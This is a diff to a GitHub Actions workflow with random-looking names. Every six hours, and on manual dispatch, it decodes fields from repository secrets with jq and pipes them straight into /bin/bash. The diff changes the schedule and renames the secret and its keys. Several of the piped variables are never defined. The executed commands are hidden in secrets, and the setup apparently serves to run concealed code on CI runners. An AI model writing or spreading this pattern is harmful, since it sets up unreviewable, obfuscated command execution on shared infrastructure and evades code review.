@@ -3,18 +3,20 @@ name: zhangnubi4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
-jobs:  # 6581
+    - cron: '10 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangnubi4567
         env:
-          uz4: ${{ secrets.uz4 }}
+          vek27: ${{ secrets.vek27 }}
         run: |
-          echo $uz4 | jq -r .jatxs847 | /bin/bash
-          echo $xrr3623 | jq -r .pd982 | /bin/bash
-          echo $m84 | jq -r .pguqw0 | /bin/bash
-          echo $aovtw32993 | jq -r .x21016 | /bin/bash
+          echo $vek27 | jq -r .mnjux131 | /bin/bash
+          echo $jg31934 | jq -r .vchx6 | /bin/bash
+          echo $dxsvs4 | jq -r .oip69288 | /bin/bash
+          echo $oy94964 | jq -r .gt832 | /bin/bash
 
